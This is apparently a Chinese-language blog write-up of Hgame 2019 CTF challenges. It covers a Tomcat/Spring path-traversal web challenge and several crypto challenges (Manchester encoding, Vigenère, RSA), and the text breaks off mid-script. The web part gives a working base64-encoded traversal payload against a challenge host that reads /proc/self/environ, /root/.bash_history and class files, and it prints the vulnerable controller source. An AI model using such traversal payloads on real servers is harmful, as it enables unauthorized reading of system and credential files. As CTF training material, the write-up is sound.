<p><a href="https://imgchr.com/i/kH53Xd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kH53Xd.md.png" alt="kH53Xd.md.png"></a></p>
<p><strong><em>hint：了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了</em></strong></p>
<p><strong>solution1：</strong>既然可以读取，于是尝试<code>../../../../../proc/self/environ</code>，成功读取，下载下来16进制转码得到有用的路径：</p>
<p><a href="https://imgchr.com/i/kHIVgg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHIVgg.md.png" alt="kHIVgg.md.png"></a></p>
<p><strong>solution2：</strong>还有一种方法就是读取<code>/root/.bash_history</code>查看命令历史：</p>
<p>进入tomcat：</p>
<p><img src="https://s2.ax1x.com/2019/03/01/kHIzGT.png" alt="kHIzGT.png"></p>
<p>工作目录：</p>
<p><img src="https://s2.ax1x.com/2019/03/01/kHIOZn.png" alt="kHIOZn.png"></p>
<p>到现在为止定位到：<code>usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller</code></p>
<p>试一下随便读取<code>1.php</code>，发现报错，发现了关键信息:</p>
<p><a href="https://imgchr.com/i/kHo1eA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHo1eA.md.png" alt="kHo1eA.md.png"></a></p>
<p>所以读取路径最后为：<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p>
<p><strong>payload:</strong><code>http://test.tan90.me:8080/img/Li4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M=</code></p>
<p>读取到改为后缀为class文件以后，进行反编译为java文件，得到源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hgame.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@org</span>.springframework.stereotype.Controller</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MathController</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model, HttpSession session, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (step.toString().equals(<span class="string">"1"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (step.toString().equals(<span class="string">"2"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"math"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pindex</span><span class="params">(@org.springframework.web.bind.annotation.RequestParam(<span class="string">"answer"</span>)</span> String answer, HttpSession session, HttpServletResponse response) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((step.toString().equals(<span class="string">"1"</span>)) &amp;&amp; </span><br><span class="line">      (answer.equals(<span class="string">"2"</span>))) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, <span class="string">"2"</span>);</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/img/&#123;path&#125;"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">image</span><span class="params">(@org.springframework.web.bind.annotation.PathVariable(<span class="string">"path"</span>)</span> String path, HttpServletResponse response)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    path = <span class="keyword">new</span> String(java.util.Base64.getDecoder().decode(path));</span><br><span class="line">    InputStream f = <span class="keyword">null</span>;</span><br><span class="line">    OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f = <span class="keyword">new</span> java.io.FileInputStream(<span class="string">"/home/static/"</span> + path);</span><br><span class="line">      out = response.getOutputStream();</span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="string">' '</span>];</span><br><span class="line">      <span class="keyword">while</span> ((count = f.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        out.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">        out.flush();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.close();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现关键函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>123852^x % 612799081 = 6181254136845 % 612799081</code>， <code>^</code>为乘方，这是又考察我数论的知识啊…一想到信安数学基础就头皮发麻…直接爆破吧，就是要耗时长一点：<br>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> pow(<span class="number">123852</span>,i,<span class="number">612799081</span>) == (<span class="number">6181254136845</span> % <span class="number">612799081</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<p><img src="https://s2.ax1x.com/2019/03/01/kHbCfx.png" alt="kHbCfx.png"></p>
<p><strong><em>java在线反编译链接：<a href="http://www.javadecompilers.com" target="_blank" rel="noopener">http://www.javadecompilers.com</a></em></strong></p>
<h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="浪漫足球圣地"><a href="#浪漫足球圣地" class="headerlink" title="浪漫足球圣地"></a>浪漫足球圣地</h3><p>百度一下浪漫足球圣地，得到是曼彻斯特，也就是暗示为曼彻斯特编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure>
<p>先转换为2进制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">100101100110101010010110100101011001011010101001100101100101100110010110100110011001010101100101101001011010010110010110100101101010010110100110101001011001101010010110100110011010010110011001101001011001011010100101100101011010010110011001101001010110100110100101101010011001011010011001101001010110100110010110101001011001011010100110100101101010100110010110101001101010010110100110100101101010100110100101100101011001011010011010101001011010011010010110100101101010010110101001100101101001011010100101100101011010010110011010101001010110101010010110101010011010010110101001100101101001101010100101100110101001010101011001</span><br></pre></td></tr></table></figure>
<p>按照<a href="https://www.ezloo.com/2008/05/manchester_encoding.html" target="_blank" rel="noopener">曼彻斯特编码标准</a>进行转码：<code>&#39;10&#39;-&gt;&#39;0&#39;       &#39;01&#39;-&gt;&#39;1&#39;</code>替换以后正常解码即可；</p>
<p>解题脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">s=<span class="string">"966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559"</span></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res+=<span class="string">'&#123;:04b&#125;'</span>.format(int(i,<span class="number">16</span>))</span><br><span class="line"><span class="comment"># print res</span></span><br><span class="line">fin=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> res[j:j+<span class="number">2</span>]==<span class="string">'10'</span>:</span><br><span class="line">        fin+=<span class="string">'0'</span></span><br><span class="line">    <span class="keyword">elif</span> res[j:j+<span class="number">2</span>]==<span class="string">'01'</span>:</span><br><span class="line">        fin+=<span class="string">'1'</span></span><br><span class="line"><span class="comment"># print fin</span></span><br><span class="line">flag=int(fin,<span class="number">2</span>)</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(flag).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure>
<h3 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h3><blockquote>
<p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p>
</blockquote>
<p>未完待续……</p>
<h3 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h3><blockquote>
<p>cipher:<br>Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</p>
<p>key: guess</p>
</blockquote>
<p>在线解密即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;gfyuytukxariyydfjlplwsxdbzwvqt&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Hgame-2019几道有趣的RSA"><a href="#Hgame-2019几道有趣的RSA" class="headerlink" title="Hgame-2019几道有趣的RSA"></a>Hgame-2019几道有趣的RSA</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><blockquote>
<p>e = 12<br>p = 58380004430307803367806996460773123603790305789098384488952056206615768274527<br>q = 81859526975720060649380098193671612801200505029127076539457680155487669622867<br>ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460<br>算出的m转化成字符串</p>
</blockquote>
<p>说实话这题本来以为很简单的，想直接求私钥，直接求解，没想到算出来φ(n)和e=12不互素，无法求出e对应的公钥，所以直接解是没有办法的；</p>
<p>解法如下：</p>
<p><a href="https://imgchr.com/i/kquFSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/02/kquFSI.md.jpg" alt="kquFSI.md.jpg"></a></p>
<p>解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	e = <span class="number">12</span></span><br><span class="line">	p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">	q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">	ciphertext = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">	n=p*q</span><br><span class="line">	ol=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">	d=gmpy2.invert(<span class="number">3</span>,ol)</span><br><span class="line">	ciphertext1=pow(ciphertext,d,n)</span><br><span class="line">	ans=rabin_decrypt(ciphertext1,p,q,e=<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">		temp=rabin_decrypt(i,p,q,e=<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> temp:</span><br><span class="line">			flag=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line">				<span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><blockquote>
<p>m为17位十进制数，提交格式hgame{m}</p>
<p>e1:0x33240</p>
<p>e2:0x3e4f</p>
<p>n:0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</p>
<p>c1:0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</p>
<p>c2:0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</p>
<p>c1=pow(m, e1, n)<br>c2=pow(m, e2, n)</p>
</blockquote>
<p>先转化为10进制，发现e1=209472，e2=15951，e1,e2不互素，最大公因数为3；本想用共模攻击，但是e1和e2不互素，没办法达到共模攻击的条件，但是仔细推来发现：</p>
<blockquote>
<p>gcd(e1,e2)=3，则gcd(e1/3,e2/3)=1</p>
<p>所以令a1=e1/3,a2=e2/3，则gcd(a1,a2)=1</p>
<p>所以存在r*a1+s*a2=1，所以r*e1+s*e2=3 (扩展欧几里得算法)</p>
<p>则(c1^r)*(c2^s)=(m^(r*e1))<em>(m^(s\</em>e2))=m^(r*e1+s*e2)=m^3 //共模攻击</p>
<p>所以到此为止：(m^3) mod n=(c1^r)*(c2^s) mod n 为已知数</p>
<p>所以直接低指数攻击即可</p>
</blockquote>
<p>上解题脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_attack</span><span class="params">(e1,e2,mess1,mess2,n)</span>:</span></span><br><span class="line">	gcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line">	<span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line">		s=-s</span><br><span class="line">		mess1=gmpy2.invert(mess1,n)</span><br><span class="line">	<span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line">		t=-t</span><br><span class="line">		mess2=gmpy2.invert(mess2,n)</span><br><span class="line">	mess=gmpy2.powmod(mess1,s,n)*gmpy2.powmod(mess2,t,n)%n</span><br><span class="line">	<span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_attack</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">	i=<span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">	        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">	        <span class="keyword">print</span> x</span><br><span class="line">	        <span class="keyword">break</span></span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	e1=<span class="string">"0x33240"</span></span><br><span class="line">	e2=<span class="string">"0x3e4f"</span></span><br><span class="line">	n=<span class="string">"0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1"</span></span><br><span class="line">	c1=<span 